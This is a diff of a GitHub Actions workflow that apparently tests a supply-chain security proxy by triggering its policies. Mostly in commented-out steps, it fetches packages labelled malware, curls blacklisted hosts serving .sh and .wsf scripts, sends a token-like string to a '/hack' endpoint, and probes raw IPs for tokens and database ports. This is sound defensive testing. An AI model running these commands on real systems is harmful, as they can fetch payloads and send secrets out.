@@ -29,10 +29,10 @@ jobs:
       #   run: git --version
          
       - name: Setup PSE
-        uses: invisirisk/pse-action@latest
+        uses: invisirisk/pse-action@dev-test
         with:
-          api_url: "https://app.invisirisk.com"
-          app_token: ${{ secrets.IR_API_KEY_CB_STAGE }}
+          api_url: "https://app.stage.invisirisk.com"
+          app_token: ${{ secrets.IR_API_KEY_STAGE }}
           mode: "docker-intercept"
 
       - uses: actions/checkout@v4
@@ -53,9 +53,49 @@ jobs:
       #   continue-on-error: true
       #   run: pip install numpy==1.9.3 --no-deps --index-url https://test.pypi.org/simple/
 
-      - name: Install MALWARE package
+      - name: Install Critical Vulnerable package (in dataset)
         continue-on-error: true
-        run: curl -k -O https://files.pythonhosted.org/packages/83/5c/0627be4c9976d56b1217cb5187b7504e7fd7d3503f8bfd312a04077bd4f7/abilityrequests-0.0.5-py2.py3-none-any.whl.metadata
+        run: curl -k -O https://files.pythonhosted.org/packages/83/5c/0627be4c9976d56b1217cb5187b7504e7fd7d3503f8bfd312a04077bd4f7/pandasai-0.8.1-py2.py3-none-any.whl.metadata
+      
+  #    - name: Install MALWARE package (Custom Builtins)
+     #   continue-on-error: true
+  #      run: curl -k -O https://files.pythonhosted.org/packages/83/5c/0627be4c9976d56b1217cb5187b7504e7fd7d3503f8bfd312a04077bd4f7/abilityrequests-0.0.5-py2.py3-none-any.whl.metadata
+
+    #  - name: Install MALWARE package (Custom Builtins)
+   #     continue-on-error: true
+    #    run: curl -k -O https://files.pythonhosted.org/packages/83/5c/0627be4c9976d56b1217cb5187b7504e7fd7d3503f8bfd312a04077bd4f7/moxel-python-driver-0.0.1-py2.py3-none-any.whl.metadata
+
+     # - name: Install MALWARE package (Custom Builtins)
+     #   continue-on-error: true
+     #   run: curl -k -O https://files.pythonhosted.org/packages/83/5c/0627be4c9976d56b1217cb5187b7504e7fd7d3503f8bfd312a04077bd4f7/phishermanx-4.0.1-py2.py3-none-any.whl.metadata
+
+    # - name: Install MALWARE package (Custom Builtins)
+    ##    continue-on-error: true
+     #   run: curl -k -O https://files.pythonhosted.org/packages/83/5c/0627be4c9976d56b1217cb5187b7504e7fd7d3503f8bfd312a04077bd4f7/shiva123456-23.99.0-py2.py3-none-any.whl.metadata
+
+     # - name: Install MALWARE package (Custom Builtins)
+     #   continue-on-error: true
+      #  run: curl -k -O https://files.pythonhosted.org/packages/83/5c/0627be4c9976d56b1217cb5187b7504e7fd7d3503f8bfd312a04077bd4f7/yuzo-1.0.0-py2.py3-none-any.whl.metadata
+
+   #   - name: Install KEV package (Custom Builtins)
+    #    continue-on-error: true
+    #    run: curl -k -O https://files.pythonhosted.org/packages/83/5c/0627be4c9976d56b1217cb5187b7504e7fd7d3503f8bfd312a04077bd4f7/langflow-base-0.0.50-py2.py3-none-any.whl.metadata
+        
+     # - name: Install KEV package (Custom Builtins)
+    #    continue-on-error: true
+     #   run: curl -k -O https://files.pythonhosted.org/packages/83/5c/0627be4c9976d56b1217cb5187b7504e7fd7d3503f8bfd312a04077bd4f7/salt-2015.8.0rc1-py2.py3-none-any.whl.metadata
+
+     # - name: Curl blacklisted host (Custom Builtins)
+    #    run: curl https://ethical-points-competitive-fluid.trycloudflare.com/QFB3wsf/7/8/9/uju.wsf
+
+   #   - name: Curl blacklisted host (Custom Builtins)
+   #    run: curl https://f3n7k.798u-g.ru/q6a13xi27h.sh
+
+    #  - name: Curl blacklisted host (Custom Builtins) - latest
+    #    run: curl https://c8r5q.3-f72v.ru/wie4js1mje.sh
+
+   #   - name: Content length download
+    #    run: curl  -o 1GB.bin "https://nbg1-speed.hetzner.com/1GB.bin"
 
       # - name: Install with different checksum
       #   continue-on-error: true
@@ -80,29 +120,27 @@ jobs:
       #   continue-on-error: true
       #   run: sleep 200
 
-      # # # - name: 😈 Execute malicious script
-      # # #   run: bash run_malicious_scripts.sh
+    #  - name: 😈 Execute malicious script
+   #     run: bash run_malicious_scripts.sh
 
-      # - name: Secret Leak Policy
-      #   run: |
-      #     curl -k -X GET https://vbirmock.free.beeceptor.com/hack \
-      #       -H "Content-Type: application/json" \
-      #       -d '{
-      #       "GH": "ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"
-      #     }'
-      #     echo "Exit code: $?"
+   #   - name: Secret Leak Policy
+     #   run: |
+       #     curl -k -X GET https://vbirmock.free.beeceptor.com/hack \
+         #     -H "Content-Type: application/json" \
+         #     -d '{
+        #      "GH": "ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"
+         #   }'
+          #  echo "Exit code: $?"
 
       # - name: Mock API key exposure request
       #   run: |
       #     curl "https://example.com/data?api_key=ghp_N4GLp6K2gwqWupGTRjz9P7AOth62XP5OhliA"
           
-      # - name: Response Status Code Policy (Trigger 400 Bad Request)
-      #   run: curl -k -X POST https://api.github.com/endpoint
+   #   - name: Response Status Code Policy (Trigger 400 Bad Request)
+    #    run: curl -k -X POST https://api.github.com/endpoint
 
-      # - name: Mime Type Policy
-      #   run: curl -s -L "https://tinyurl.com/invisirisk"
-
-     
+   #   - name: Mime Type Policy
+   #     run: curl -s -L "https://tinyurl.com/invisirisk"
 
       # - name: Send POST request with curl
       #   run: |
@@ -110,8 +148,17 @@ jobs:
       #       -H "Content-Type: application/json" \
       #       -d '{"key1":"value1", "key2":"value2"}'
 
-      # - name: new host      
-      #   run: curl https://www.google.com
+      - name: new host      
+        run: curl https://www.google.com
+      
+   #   - name: new host  
+   #     run: curl -X GET http://80.78.28.72/tokens
+   #   - name: new host  
+   #     run: curl -X GET http://ipinfo.io/json
+  #    - name: new host
+  #      run: curl -X GET http://136.0.9.8:3306
+ #     - name: new host
+  #      run: curl -X GET http://136.0.9.8:27017
 
       # - name: Simple PUT request
       #   run: |
@@ -119,12 +166,12 @@ jobs:
       #     -H "Content-Type: application/json" \
       #     -d '{"key": "value"}'
 
-      # - name: Install dependencies
-      #   run: pip install -r requirements.txt
+    #  - name: Install dependencies
+   #     run: pip install -r requirements.txt
 
       - name: Cleanup PSE
         if: always()
-        uses: invisirisk/pse-action@latest
+        uses: invisirisk/pse-action@dev-test
         with:
           cleanup: "true"
 
@@ -135,31 +182,9 @@ jobs:
     if: always()
     steps:
       - name: Gather Status
-        uses: invisirisk/pse-action@latest
+        uses: invisirisk/pse-action@dev-test
         with:
-          api_url: "https://app.invisirisk.com"
-          app_token: ${{ secrets.IR_API_KEY_CB_STAGE }}
+          api_url: "https://app.stage.invisirisk.com"
+          app_token: ${{ secrets.IR_API_KEY_STAGE }}
           send_job_status: "true"
           debug: "true"
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
